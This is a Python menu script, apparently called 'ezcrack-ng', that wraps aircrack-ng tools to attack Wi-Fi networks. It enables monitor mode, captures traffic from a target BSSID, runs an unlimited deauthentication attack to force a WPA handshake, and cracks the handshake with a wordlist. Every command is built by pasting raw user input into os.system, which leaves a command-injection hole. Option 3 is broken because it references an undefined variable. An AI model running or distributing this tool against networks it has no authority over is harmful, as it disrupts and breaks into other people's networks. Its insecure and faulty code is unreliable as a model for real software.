import os
from colorama import Fore as f
from pyfiglet import Figlet

fig = Figlet(font="slant")
print(f.BLUE + fig.renderText("ezcrack-ng"))
print(f.BLUE + "	Rewritten by https://github.com/jasonmichael13")
print(f.BLUE + 60 * "-")

print(f.WHITE + "\n\n{1} " + f.RED + "Start monitor mode")
print(f.WHITE + "{2} " + f.RED + "View your interfaces")
print(f.WHITE + "{3} " + f.RED + "Monitor network")
print(f.WHITE + "{4} " + f.RED + "Obtain a WPA handshake")
print(f.WHITE + "{5} " + f.RED + "Stop monitor mode")
print(f.WHITE + "{6} " + f.RED + "Crack WPA handshake/hash\n\n")

choice = int(input(f.WHITE + "[*] Option: "))

if choice == 1:
	interface = input(f.BLUE + "Interface: ")
	os.system("airmon-ng start " + interface)

elif choice == 2:
	os.system("sudo ifconfig")

elif choice == 3:
	bssid = input(f.BLUE + "[*] Enter the BSSID: ")
	channel = input("[*] Channel: ")
	write = input("[*] Where would you like to store the WPA handshake: ")
	ifcae = input(f.RED + "\n[*] Interface: ")
	os.system("airodump-ng --bssid " + bssid + " --channel " + channel + " --write " + write + " " + iface)
elif choice == 4:
	bssid2 = input(f.RED + "BSSID of target network: ")
	iface2 = input(f.RED + "Interface: ")
	os.system("aireplay-ng --deauth 0 -a " + bssid2 + " " + iface2)
elif choice == 5:
   os.system("airmon-ng stop wlan0mon")
   os.system("airmon-ng stop wlan1mon")
   os.system("airmon-ng stop wlan2mon")
elif choice == 6:
	hashfile = input(f.BLUE + "Path to handshake file: ")
	wlist = input (f.BLUE + "Path to wordlist: ")
	os.system("aircrack-ng " + hashfile + " -w " + wlist)
